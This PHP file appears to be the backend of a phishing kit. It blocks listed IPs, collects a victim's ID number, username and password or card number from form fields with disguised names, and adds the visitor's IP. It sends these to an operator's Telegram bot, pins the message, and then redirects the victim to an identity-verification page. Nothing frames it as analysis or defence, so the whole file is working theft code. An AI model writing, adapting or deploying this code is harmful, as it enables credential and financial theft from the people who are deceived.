<?php

session_start();

function isIpBlocked($ipToCheck, $blockedIps)
{
    foreach ($blockedIps as $blockedIp) {
        if ($ipToCheck === $blockedIp['ip']) {
            return true;
        }
    }
    return false;
}

$ipVisitante = $_SERVER['REMOTE_ADDR'];

$ipsBloqueadas = json_decode(file_get_contents('panel-adm/ip_blocked.json'), true);

if (isIpBlocked($ipVisitante, $ipsBloqueadas)) {
    header("Location: error.html");
    exit;
}


require_once("./panel-adm/obtenerconfig.php");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $c_dni = $_POST["beyerr"];
    $c_user = $_POST["lillyy"];
    $c_pass = $_POST["pachuu"];

    $configuracion = obtenerConfiguracion();

    $datos = json_decode(file_get_contents('./panel-adm/mensaje.json'), true);
    $mensajePersonalizado = $datos['mensajePersonalizado'];
    $nombreApp = isset($datos['nombreApp']) ? $datos['nombreApp'] : '';
    $firma = isset($datos['firma']) ? $datos['firma'] : '';


    $ipVisitante = $_SERVER['REMOTE_ADDR'];

    $mensaje = str_replace('{nombre}', $c_dni, $mensajePersonalizado);
    $mensaje = str_replace('{denei}', $c_user, $mensaje);
    $mensaje = str_replace('{numbercc}', $c_pass, $mensaje);
    $mensaje = str_replace('{ip}', $ipVisitante, $mensaje);

    $mensaje = str_replace('{NombreDeAPP}', $nombreApp, $mensaje);
    $mensaje = str_replace('{FIRMA}', $firma, $mensaje);


    $api_url = "https://api.telegram.org/bot" . $configuracion['token'] . "/sendMessage";


    $params = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query([
                'chat_id' => $configuracion['chat_id'],
                'text' => $mensaje,
                'parse_mode' => 'HTML',
            ]),
        ],
    ];


    $context = stream_context_create($params);


    $result = file_get_contents($api_url, false, $context);

    if ($result === false) {

    } else {

        $response = json_decode($result, true);


        $message_id = $response['result']['message_id'];


        $pin_url = "https://api.telegram.org/bot" . $configuracion['token'] . "/pinChatMessage";

        $pin_params = [
            'http' => [
                'method' => 'POST',
                'header' => 'Content-type: application/x-www-form-urlencoded',
                'content' => http_build_query(['chat_id' => $configuracion['chat_id'], 'message_id' => $message_id]),
            ],
        ];

        $pin_context = stream_context_create($pin_params);


        $pin_result = file_get_contents($pin_url, false, $pin_context);

        if ($pin_result === false) {

        }


        header("Location: identidad.html");
        exit;
    }
}
